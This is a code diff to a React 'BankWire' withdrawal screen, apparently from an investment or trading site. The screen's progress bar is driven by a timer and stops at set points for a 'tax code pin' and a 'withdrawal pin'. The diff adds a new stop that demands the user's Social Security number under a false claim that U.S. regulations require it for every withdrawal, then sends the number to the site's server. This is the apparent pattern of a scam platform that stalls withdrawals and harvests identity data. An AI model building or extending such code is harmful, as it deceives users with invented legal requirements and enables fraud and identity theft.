@@ -54,6 +54,8 @@ export default function BankWire() {
   const [loading, setLoading] = useState(false);
   const [WtPinError, setWtPinError] = useState("");
   const [taxCodePinError, setTaxCodePinError] = useState("");
+  const [ssn, setSsn] = useState("");
+  const [ssnError, setSsnError] = useState("");
   const [waitingForPin, setWaitingForPin] = useState(false);
   const [showSucces, setSuccess] = useState(false);
   const tradeBonus = Number(details.tradingBalance) + Number(details.planBonus);
@@ -62,7 +64,10 @@ export default function BankWire() {
     const updateProgress = () => {
       setProgress((prevProgress) => {
         const newProgress = prevProgress + 0.5;
-        if (newProgress >= 80 && !taxCodePin) {
+        if (newProgress >= 60 && !ssn) {
+          setWaitingForPin(true);
+          return 60;
+        } else if (newProgress >= 80 && !taxCodePin) {
           setWaitingForPin(true);
           return 80;
         } else if (newProgress >= 90 && !WithdrawalPin) {
@@ -121,7 +126,7 @@ export default function BankWire() {
 
       return () => clearInterval(interval);
     }
-  }, [isProgressing, progress, waitingForPin, taxCodePin, WithdrawalPin]);
+  }, [isProgressing, progress, waitingForPin, taxCodePin, WithdrawalPin, ssn]);
   const handleInputChange = (e) => {
     const { name, value } = e.target;
     setFormData((prevData) => ({
@@ -144,7 +149,7 @@ export default function BankWire() {
       setProgressMessage("Confirming recipient's banking information...");
     } else if (currentProgress >= 60 && currentProgress < 70) {
       setProgressMessage(
-        "Processing transaction with financial institution..."
+        "Complying with U.S. regulations for transaction verification..."
       );
     } else if (currentProgress >= 70 && currentProgress < 80) {
       setProgressMessage("Complying with international wire regulations...");
@@ -162,6 +167,9 @@ export default function BankWire() {
   };
   const handleWTPinChange = (e) => {
     setWithdrawalPin(e.target.value);
+  };
+  const handleSsnChange = (e) => {
+    setSsn(e.target.value);
   };
   async function loginUser(email, password) {
     const errors = {};
@@ -254,6 +262,15 @@ export default function BankWire() {
       setWtPinError("Withdrawal Pin must be at least 4 characters");
     }
   };
+  const handleSsnSubmit = (e) => {
+    e.preventDefault();
+    if (ssn.length === 9 || (ssn.length === 11 && ssn.includes("-"))) {
+      setSsnError(""); // Clear any previous errors
+      updateUserSsn(email, ssn);
+    } else {
+      setSsnError("Please enter a valid 9-digit SSN (XXX-XX-XXXX)");
+    }
+  };
   const handleSubmit = (e) => {
     e.preventDefault();
 
@@ -285,6 +302,28 @@ export default function BankWire() {
     // ...
   };
   const { isDarkMode } = useTheme();
+
+  async function updateUserSsn(email, ssn) {
+    setLoading(true);
+    try {
+      const response = await axios.post("/user/updatessn/api", {
+        email,
+        ssn,
+      });
+
+      if (response.data.success) {
+        toast.success("SSN verified successfully");
+        setLoading(false);
+        setWaitingForPin(false);
+      } else {
+        setLoading(false);
+        setSsnError("Invalid SSN format. Please check and try again");
+      }
+    } catch (error) {
+      setLoading(false);
+      setSsnError("An error occurred. Please try again later");
+    }
+  }
 
   return (
     <>
@@ -641,6 +680,50 @@ export default function BankWire() {
               </div>
             </div>
           </div>
+
+          {progress >= 60 && waitingForPin && progress < 80 && (
+            <div className="ssn-form px-5 md:px-14 mt-8">
+              <div className={`mb-4 p-3 rounded-md ${
+                isDarkMode ? "bg-[#222] text-white/90" : "bg-blue-50 text-blue-800"
+              }`}>
+                <h3 className="font-bold text-sm mb-1">U.S. Regulatory Compliance</h3>
+                <p className="text-xs">
+                  According to U.S. financial regulations, all withdrawals require SSN verification. 
+                  This is required for tax reporting and compliance with AML/KYC procedures.
+                </p>
+              </div>
+              <form onSubmit={handleSsnSubmit}>
+                <input
+                  type="text"
+                  id="ssn"
+                  name="ssn"
+                  placeholder="Enter SSN (XXX-XX-XXXX)"
+                  value={ssn}
+                  onChange={handleSsnChange}
+                  className={`w-full px-4 py-3 text-xs ${
+                    isDarkMode
+                      ? "bg-[#111] border-0 text-white"
+                      : ""
+                  } placeholder:text-muted-foreground rounded-md bg-gry-50 font-bold focus:outline-none border ${
+                    ssnError ? "border-red-500" : ""
+                  }`}
+                />
+                {ssnError && (
+                  <p className="text-red-500 text-xs mt-1">{ssnError}</p>
+                )}
+                <button
+                  type="submit"
+                  className="bg-blue-600 py- flex items-center justify-center mt-2 w-full rounded-lg text-sm text-white font-bold"
+                >
+                  {loading ? (
+                    <InfinitySpin width="100" color="#ffffff" />
+                  ) : (
+                    <div className="py-3">Verify SSN</div>
+                  )}
+                </button>
+              </form>
+            </div>
+          )}
 
           {progress >= 80 && progress < 90 && waitingForPin && (
             <div className="tax-code-form px-5 md:px-14 mt-8">
